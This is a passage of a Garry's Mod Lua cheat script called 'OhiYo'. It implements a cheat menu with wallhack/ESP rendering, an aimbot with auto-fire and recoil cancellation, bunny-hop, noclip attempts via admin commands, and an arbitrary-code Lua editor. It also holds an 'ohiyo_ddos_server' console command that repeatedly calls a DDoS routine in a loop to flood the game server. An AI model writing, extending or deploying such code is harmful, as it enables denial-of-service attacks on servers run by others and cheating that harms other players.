                function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                function()            
                     
                    RunConsoleCommand("ohiyo_ddos_server")
                end
                )
            end)

            chmenu.panels["lua_editor"] = panel(self,
            {             
                pos = {x = 0 , y = 30},
                size = {x = self:GetWide() , y = self:GetTall() - 30},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,255,255,0))
            end
            ):paddition(function(self)
                
                self.Log = vgui.Create("RichText", self) 
                self.Log:SetSize( self:GetWide(),self:GetTall() - 100 )
                self.Log:SetPos( 0, 5 )
                self.Log.Paint = function( self, w, h )
                    draw.RoundedBox( 0, 0, 0, w, h, Color( 30, 30, 30, 100 ) )
                end
                self.Log.PerformLayout = function( self )
                    self:SetFontInternal("logfont")
                    self:SetFGColor( color_white )
                end
          
                local log_ = self.Log
                self.entry = vgui.Create("DTextEntry", self) 
                self.entry:SetSize(self:GetWide() , 40 )
                self.entry:SetTextColor( color_white )
                self.entry:SetFont("logfont")
                self.entry:SetDrawBorder( false )
                self.entry:SetDrawBackground( false )
                self.entry:SetCursorColor( color_white )
                self.entry:SetHighlightColor( Color(52, 152, 219) )
                self.entry:SetPos( 0, self:GetTall() - 100 )
                self.entry.Paint = function( self, w, h )
                    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 255 ) )
                    derma.SkinHook( "Paint", "TextEntry", self, w, h )
                end

                self.entry.OnKeyCodeTyped = function( self, code )
                    local msg = ""
                    if code == KEY_ENTER then
                        msg = self:GetText()
                        if(string.StartWith(msg, ']]')) then
                            msg = string.sub( msg, 3)
                            msg = CompilerReturn(msg,LocalPlayer())
                        elseif(string.StartWith(msg, ']')) then
                            msg = string.sub( msg, 2)
                            msg = "return "..msg
                            msg = CompilerReturn(msg,LocalPlayer())
                        end   
                        log_:InsertColorChange( 0, 128, 255, 255 )
                        log_:AppendText( msg or "<nil>" .."\n" )    
                         
                    end
                end
                
            end)
        end)

        self.left_panel = vgui.Create( "DPanel" , self )
        self.left_panel:SetPos( 0, 0 ) 
        self.left_panel:SetSize( self:GetWide() * 0.3 , self:GetTall()  )
        self.left_panel.Paint = function(self,w,h)                                         
            draw.RoundedBox(0, 0, 0, w, h, Color(24,24,24,100))
            draw.RoundedBox(0, w - 2, 0, w, h, Color(255,255,255,87))
        end
        local local_pos_y = 0
        local function Downy( int_ )
            local_pos_y = local_pos_y + int_
            return  local_pos_y
        end
        self.left_panel:paddition(function(self)
            label(self , 
            {
                font = "NAMECHAT" ,
                text = "OhiYo" , 
                argbtext = Color(255,255,255)
            }, 
            { 
                pos = {x = 60 , y = 10},
                size = {x = 100 , y = 25},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
            end
            )
            
            label(self, 
                {
                    font = "TEXT_L" ,
                    text = "Visuals" , 
                    argbtext = Color(175,175,175)
                }, 
                { 
                    pos = {x = 10 , y = Downy( 60 )},
                    size = {x = 100 , y = 25},
                },
                function(self,w,h)
                    draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
                end
            ) 
             
            labelclick(self , 
                {
                    font = "TEXT_L" ,
                    text = "ESP" , 
                    argbtext = Color(255,255,255)
                } ,
                { 
                    pos = {x = 20 , y = Downy( 25 )},
                    size = {x = 200 , y = 25}
                },
                function(self,w,h) 
                    draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) 
                end,
                function()            
                    
                    SetMainName("ESP")
                    VisibleTablePanels( chmenu.panels["ESP"] )
                end
            )
             
            labelclick(self, 
                {
                    font = "TEXT_L" ,
                    text = "HUD" , 
                    argbtext = Color(255,255,255)
                },
                { 
                    pos = {x = 20 , y = Downy( 25 )},
                    size = {x = 200 , y = 25}
                },
                function(self,w,h) 
                    draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) 
                end,
                function()            
                    SetMainName( "HUD" )
                    VisibleTablePanels( chmenu.panels["HUD"] )
                end
            )
            
            label(self, 
                {
                    font = "TEXT_L" ,
                    text = "Aim bot" , 
                    argbtext = Color(175,175,175)
                } , 
                { 
                    pos = {x = 10 , y = Downy( 25 )},
                    size = {x = 100 , y = 25},
                },
                function(self,w,h)
                    draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
                end
            )
            labelclick(self , 
                {
                    font = "TEXT_L" ,
                    text = "Aim" , 
                    argbtext = Color(255,255,255)
                } ,
                { 
                    pos = {x = 20 , y = Downy( 25 )},
                    size = {x = 200 , y = 25}
                },
                function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                function()            
                    
                    SetMainName( "Aim Bot" )
                    VisibleTablePanels( chmenu.panels["Aim Bot"] )
                end
            )
            label(self , 
                {
                    font = "TEXT_L" ,
                    text = "Copy prop" , 
                    argbtext = Color(175,175,175)
                } , 
                { 
                    pos = {x = 10 , y =  Downy( 25 )},
                    size = {x = 100 , y = 25},
                },
                function(self,w,h)
                    draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
                end
            )
            labelclick(self , 
                {
                    font = "TEXT_L" ,
                    text = "Copy" , 
                    argbtext = Color(255,255,255)
                },
                { 
                    pos = {x = 20 , y = Downy( 25 )},
                    size = {x = 200 , y = 25}
                },
                function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                function()            
                    
                    SetMainName( "Copy prop" )
                    VisibleTablePanels( chmenu.panels["Copy prop"] )
                end
            )
            label(self, 
            {
                font = "TEXT_L" ,
                text = "DDos server" , 
                argbtext = Color(175,175,175)
            } , 
            { 
                pos = {x = 10 , y = Downy( 25 )},
                size = {x = 100 , y = 25},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
            end
            )
            labelclick(self , 
                {
                    font = "TEXT_L" ,
                    text = "DDos" , 
                    argbtext = Color(255,255,255)
                } ,
                { 
                    pos = {x = 20 , y = Downy( 25 )},
                    size = {x = 200 , y = 25}
                },
                function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                function()            
                    
                    SetMainName( "DDOS" )
                    VisibleTablePanels( chmenu.panels["ddos_panel"] )
                end
            )
            -- lua editor 
            label(self, 
            {
                font = "TEXT_L" ,
                text = " Lua Editor" , 
                argbtext = Color(175,175,175)
            } , 
            { 
                pos = {x = 10 , y = Downy( 25 )},
                size = {x = 100 , y = 25},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
            end
            )
            labelclick(self , 
                {
                    font = "TEXT_L" ,
                    text = "Editor" , 
                    argbtext = Color(255,255,255)
                } ,
                { 
                    pos = {x = 20 , y = Downy( 25 )},
                    size = {x = 200 , y = 25}
                },
                function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                function()            
                    
                    SetMainName( "lua_editor" )
                    VisibleTablePanels( chmenu.panels["lua_editor"] )
                end
            )
        end)    
    end)

    SetMainName( "ESP" )
    VisibleTablePanels( chmenu.panels["ESP"] )
end

hook.Add( "PlayerSwitchWeapon", "WeaponSwitchExample", function( ply, oldWeapon, newWeapon )
	chmenu.cheat.hud.cur_weap = newWeapon:GetClass() 	
end )
local sh_ = true  
hook.Remove("HUDPaint", "ch_wh_1")
hook.Add( "HUDPaint", "ch_wh_1", function()
    if( chmenu.cheat.wh.active ) then   
        
        cam.Start3D()  
        for id, ply in pairs( player.GetAll() ) do
            if(ply:IsValid() and ply:IsPlayer()) then
                if( ply:Alive() and not ply:IsBot()) then 
                    ply:DrawModel()                     
                end
            end           
        end 
        cam.End3D()
    end  
    if( chmenu.cheat.wh.active_b  ) then 
  
        cam.Start3D()
        for id, bot in pairs( player.GetBots() ) do
            if(bot:IsValid()) then
                if( bot:IsBot() ) then 
                    if( bot:Alive() ) then 
                        bot:DrawModel()
                        bot:SetColor( Color(255,255,255))     
                    end                    
                end
            end          
        end
        cam.End3D()    
    end 
    if( chmenu.cheat.wh.active_n  ) then 
        for k,ply in pairs ( player.GetAll() ) do
            if(ply:IsValid() and ply:IsPlayer() and ply != LocalPlayer()) then
            
                --local Position = ( ply:GetPos() + Vector( 0,0,80 ) ):ToScreen()
                local Position = ply:LocalToWorld(Vector(0,0,80)):ToScreen()
                draw.DrawText( ply:Name(), "TargetID", Position.x, Position.y, Color( 255, 255, 255, 255 ), 1 )    
              
            end         
        end    
    end 
    if( chmenu.cheat.wh.active_weapons_all ) then 
        cam.Start3D()
        local len = 0
         
        for k,ent in pairs ( ents.FindInSphere(LocalPlayer():GetPos(),2000) ) do
            len = LocalPlayer():GetPos():Distance( ent:GetPos() )
            if(ent:IsValid() && len > 100 && type(ent) == "Weapons" ) then         
                ent:DrawModel()   
            end         
        end
        cam.End3D() 
        
    end 
    

    if( chmenu.cheat.wh.active_all  ) then 
        cam.Start3D()
        local len = 0
      
        for k,ent in pairs ( ents.FindInSphere(LocalPlayer():GetPos(),2000) ) do
            len = LocalPlayer():GetPos():Distance( ent:GetPos() )
            if(ent:IsValid() && len > 100 ) then         
                ent:DrawModel()   
            end         
        end
        cam.End3D()   
             
    end 
    if( chmenu.cheat.hud.information) then 
        local Aim_ent = GetEyeTraceEnt()
       
        if(IsValid(Aim_ent) && not IsValid(LocalPlayer():GetVehicle()) && isWeapon(chmenu.cheat.hud.cur_weap , {"gmod_tool" , "weapon_physgun"})) then 
            
            local Ent_inf =
            {
                "Class: "..Aim_ent:GetClass()  .. " Type: " .. type(Aim_ent),
                "Pos: "..GetPosToString(Aim_ent),
                "Ang: "..GetAngleToString(Aim_ent),
                "Color: "..GetColorToString(Aim_ent),
                "Index: "..Aim_ent:EntIndex(),
                "Material: \""..GetMatreial(Aim_ent).."\"",	
                "Model: \"" .. Aim_ent:GetModel() .. "\"",
            } 
            local str_copy = "Shift + c -> copy"
            surface.SetFont("Arial_15")
            local size_p_h = table.Count(Ent_inf) * 15

            DrawBox( 5,ScrH() / 2 ,GetMaxSize(Ent_inf) + 10 , size_p_h  , Color(26, 26, 26, 150))

            for h,v in pairs(Ent_inf) do
                DrawText(v , 0 ,ScrH() / 2 + (h-1) * 14 + 3 )
                
            end 
            surface.SetDrawColor( 26, 26, 26, 150)
            surface.DrawRect( 5, ScrH() / 2 + size_p_h + 5,  surface.GetTextSize(str_copy) + 10 , 18) 


            DrawText(str_copy, 0 ,ScrH() / 2 + size_p_h + 6 )

        end
    end
    if( chmenu.cheat.hud.cursor ) then 
        local w_2 = ScrW()/2
        local h_2 = ScrH()/2
        surface.SetDrawColor( 255, 0, 0, 128 )
        surface.DrawLine( w_2-10  , h_2,w_2+10  , h_2)
        surface.DrawLine( w_2  , h_2 - 10,w_2  , h_2 + 10)
    end
    if( chmenu.cheat.aimbot.active ) then 
        local rad = chmenu.cheat.aimbot.rad
        surface.SetDrawColor( 255, 0, 0, 128 )
        surface.DrawCircle(ScrW() / 2, ScrH() / 2,rad , 255, 0, 0, 128)
        local lolcat
        local oldpos
        local dist = 0
        local ta = player.GetAll()
 
         
        table.Add(ta,  ents.FindByClass("npc_*"))
        table.Add(ta, ents.FindByClass("NPC"))
        
        --if( LocalPlayer():GetEyeTrace().Entity:EntIndex() == 0 ) then return end 
       
        for k,p in pairs(ta) do
            local pos = GetBonePosPlayer(p)
            local al = true
            
            if( p:IsNPC()) then 

                al = true
            end
            if( p:IsPlayer() ) then 
                if( p:Alive()) then 
                    al = true
                else 
                    al = false
                end 
            end 
            if pos and al && p != LocalPlayer() then
                local scrpos = pos:ToScreen()
                dist = math.Distance(ScrW() / 2, ScrH() / 2, scrpos.x, scrpos.y)
                if scrpos.visible and dist < rad then
                    if not lolcat or oldpos > dist then
                        local tr = util.TraceLine( 
                            {
                                start = LocalPlayer():EyePos(),
                                endpos = LocalPlayer():EyePos() + (pos-LocalPlayer():EyePos()):Angle():Forward()*50000
                            }
                        )
                        if tr and tr.Entity ~= game.GetWorld() then
                            lolcat = p
                            oldpos = dist
                        end
                        
                    end
                end
            end
        end

        if lolcat then
            local pos = GetBonePosPlayer(lolcat)
            local scrpos = pos:ToScreen()
           
            if(lolcat:IsPlayer() ) then 

                surface.SetFont( "Default" )
                surface.SetTextColor( 255, 255, 255 )
                surface.SetTextPos(scrpos.x, scrpos.y) 
                surface.DrawText(lolcat:Name(), false)
            end 
           
            surface.DrawCircle(scrpos.x, scrpos.y, 5, 255, 0, 0, 128)
            
            if input.IsKeyDown(KEY_LALT) then
                LocalPlayer():SetEyeAngles((pos - LocalPlayer():GetShootPos()):Angle())
                
                
            end
             
        end

    end
    
end)
hook.Remove('Think', 'ThinkPreRender')
hook.Add('Think', 'ThinkPreRender', function()
    local pres = chmenu.keyboard.pressing
    chmenu.keyboard.pressing = (KEY_END and input.IsKeyDown(KEY_END)) 
    chmenu.keyboard.pressed = not pres and chmenu.keyboard.pressing	
    if( chmenu.keyboard.pressed ) then     
        chmenu:menu()
        chmenu.keyboard.pressed = false 
    end

    local n=GetConVarNumber("auto_jump")
    local ply = LocalPlayer()
    if( not ply:Alive() ) then 
        RunConsoleCommand("-jump")
    end
	if n==1 then 
        local bool_j = ply:Alive() and ply:GetMoveType() == MOVETYPE_WALK and not ply:InVehicle() and ply:WaterLevel() <= 1
         
		if bool_j and chmenu.cheat.bhope.active and input.IsKeyDown( KEY_SPACE ) then 
			if ply:IsOnGround() then
                RunConsoleCommand("+jump")
                			 
			else
                RunConsoleCommand("-jump")				 
			end
		end
    end
    if( input.IsKeyDown(KEY_LALT) ) then 

         
        
        
    end
    local AimEnt = LocalPlayer():GetEyeTrace().Entity

    if( chmenu.cheat.aimbot.kickup && input.IsMouseDown( MOUSE_LEFT ) && sh_ == false   ) then 
        local Primary_ = LocalPlayer():GetActiveWeapon().Primary
        if( Primary_ ) then 
            
            // Angle(- Primary_.KickDown * 0.1   ,0,0) ) 

            local KickDownUp = (Primary_.KickDown or 0 + (Primary_.KickUp or 0) ) * 2

    
            LocalPlayer():SetEyeAngles( LocalPlayer():EyeAngles() - Angle( -KickDownUp * 0.1   ,0,0) )
        end
       
    end

	if(chmenu.cheat.aimbot.autoshot and input.IsKeyDown(KEY_LALT) and (AimEnt:IsPlayer() or AimEnt:IsNPC()) ) then 
        if( sh_ == false ) then 
            sh_ = true 
            RunConsoleCommand("+attack")
            
           
        else
            sh_ = false 
            RunConsoleCommand("-attack")
            
        end    
    else
        if( sh_ == true ) then 
            sh_ = false 
            RunConsoleCommand("-attack")

        end

    
    end
end)
concommand.Add("Prop2MeshCopyAimEntity", function( ply, cmd, args )
    Prop2MeshCopy()
end)
concommand.Add("Prop2MeshCopyall", function( ply, cmd, args )
	for k,ent in pairs ( ents.FindInSphere(LocalPlayer():GetPos(),1000) ) do
		len = LocalPlayer():GetPos():Distance( ent:GetPos() )
		if(ent:IsValid() && len < 1000 ) then         
			 
			Prop2MeshCopy(ent)
		end         
	end	
end)
concommand.Add("Prop2MeshCopyallNodis", function( ply, cmd, args )
	for k,ent in pairs ( ents.FindInSphere(LocalPlayer():GetPos(),100000) ) do
		
		if(ent:IsValid()  ) then         
			 
			Prop2MeshCopy(ent)
		end         
	end	
end)
concommand.Add("chmenumenu", function( ply, cmd, args )
    chmenu:menu()
end)
concommand.Add("vguic_remove", function(ply, cmd, args)
    local hover_panel = vgui.GetHoveredPanel()
    if( not hover_panel ) then return end 
    chat.AddText( Color(33,255,0) , "Remove hovered")
    hover_panel:Remove()
end)
concommand.Add("ohiyo_reset_all", function(ply, cmd, args)
    chmenu:ResetAll()
end)
concommand.Add("ohiyo_noclip", function(ply, cmd, args)    
    RunConsoleCommand("noclip")
    if( LocalPlayer():GetMoveType() != MOVETYPE_WALK) then 
        RunConsoleCommand("ulx" , "noclip")
    end
end)
concommand.Add("ohiyo_hide_SUISCOREBOARD", function(ply, cmd, args)    
    hook.Remove("ScoreboardShow","SUISCOREBOARD-Show")
    hook.Remove("ScoreboardShow","SUISCOREBOARD-Hide")

    hook.Add("ScoreboardShow","SUISCOREBOARD-Show", function()
        
    end)
    hook.Add("ScoreboardHide", "SUISCOREBOARD-Hide", function()
        
    end)

end)    
concommand.Add("ohiyo_custom_tab", function(ply, cmd, args)    
    RunConsoleCommand("ohiyo_hide_SUISCOREBOARD")

    FRunString( "scripts/u_scoreboard/lua/autorun/init.lua"  , "DATA" )
   
    chat.AddText("Custom tab")
end)
 

concommand.Add("ohiyo_ddos_server", function(ply, cmd, args)
    local arg_1 = args[1] 
    local int = tonumber(arg_1) or 1
    if( int == nil) then 
        print("[NILL]")
        return 
    end 
    local random_h = math.random(0, 1000)
    hook.Add("Think" , "test"..random_h , function()
        for i = 1, 255 do
            for d = 1,10 do 
                chmenu:DDosServer()  
            end
            if( i == 255) then 
                hook.Remove ("Think" , "test"..random_h )
            end
        end
    end)
end)

hook.Add( "StartChat", "HasStartedTyping", function( isTeamChat )
    chmenu.cheat.bhope.active = false
end )
hook.Add( "FinishChat", "ClientFinishTyping", function()
	chmenu.cheat.bhope.active = true
end )
